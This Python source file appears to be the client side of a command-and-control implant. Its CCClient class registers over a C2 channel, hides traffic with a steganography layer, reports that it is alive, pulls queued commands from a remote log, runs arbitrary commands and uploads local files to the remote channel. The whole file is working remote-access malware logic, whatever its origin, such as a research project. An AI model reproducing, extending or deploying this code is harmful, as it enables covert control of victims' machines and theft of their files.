import os.path

from ..steno import steno_base
from ..ccchanel import ccchanel_base
from ..ccchanel import log as cclog
from ..client import payloads as cpayload
from ..client import exec as cexec


class CCClient(object):
    def __init__(self, ccchanel: ccchanel_base, steno_: steno_base):
        self.ccchanel = ccchanel
        self.steno_base = steno_
        self.id = ''
        self.log_root = '/tmp'
        self.own_log = os.path.join(self.log_root, self.id)

    def is_registered(self):
        return self.id in self.ccchanel.list(self.log_root)

    def register(self):
        cclog.log_init(self.ccchanel, self.own_log, self.steno_base)

    def tell_alive(self):
        cclog.log_append(self.ccchanel, self.own_log, cpayload.alive_create(), self.steno_base)

    def get_command(self):
        log = cclog.log_read(self.ccchanel, self.own_log, self.steno_base)
        dones = []
        for log_entry in reversed(log):
            if log_entry.get('done', False):
                dones += [log_entry['done']['id']]
            elif log_entry.get('command', False) and log_entry['command']['id'] not in dones:
                return log_entry.get('command')
        return None

    def execute_command(self, local_path, *args):
        if local_path == 'upload':
            local_file_path = args[0]
            remote_file_path = os.path.join(self.log_root, local_file_path.replace('/', '_'))
            print(f"CLIENT: executing upload {local_file_path}")
            self.ccchanel.write(local_file_path, remote_file_path)
            return f"file: {local_file_path} uploaded to {remote_file_path}".encode()
        else:
            return cexec.execute_arbitrary_command(local_path, *args)
